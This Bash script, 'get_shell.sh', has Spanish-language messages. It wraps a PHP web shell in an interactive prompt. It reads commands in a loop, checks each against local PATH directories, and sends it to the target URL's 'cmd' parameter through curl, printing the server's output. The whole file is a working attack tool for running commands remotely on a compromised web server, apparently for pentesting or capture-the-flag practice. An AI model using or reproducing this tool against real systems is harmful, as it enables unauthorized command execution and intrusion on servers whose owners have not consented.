#!/bin/bash

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# VARIABLES GLOBALES
declare -a local_path
declare -r my_path="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/usr/local/go/bin:/home/noroot/.local/bin"

trap ctrl_c INT

function ctrl_c(){
        echo -e "\n[!] Saliendo ..."
        exit 1
}

function helpPanel(){
        echo -e "\n[*] Uso: ./get_shell.sh"
        echo -e "\tu) Direccion URL"
        echo -e "[i] Ejemplo: ./get_shell.sh -u http://127.0.0.1/shell.php"
        exit 0
}

function obtainShell(){
        for path in $(echo $my_path | tr ":" " "); do
                local_path+=($path)
        done

        while [ "$command" != "exit" ]; do
                counter=
                echo -ne "\n~$ " && read -r command

                for element in ${local_path[@]}; do
                        if [ -x $element/$(echo $command | awk '{print $1}') ];then
                                let counter+=1
                                break
                        elif [ "$(echo $command | awk '{print $1}')" == "cd" ]; then
                                let counter+=1
                        fi
                done

                if [ "$counter" == "1" ]; then
                        command=$(echo $command | tr ' ' "+")
                        makeRequest $command
                else
                        echo -e "\n[!] Comando $(echo $command | awk '{print $1}') no encontrado"
                fi
        done
}

function makeRequest(){
        curl "$url?cmd=$1"
        echo -ne ""
}

# MAIN FUNCTION
declare -i parameter_counter=0;

while getopts ":u:h:" arg; do
        case $arg in
                u) url=$OPTARG; let parameter_counter+=1;;
                h) helpPanel;;
        esac
done

if [ $parameter_counter -ne 1 ]; then
        helpPanel
else
        obtainShell
fi
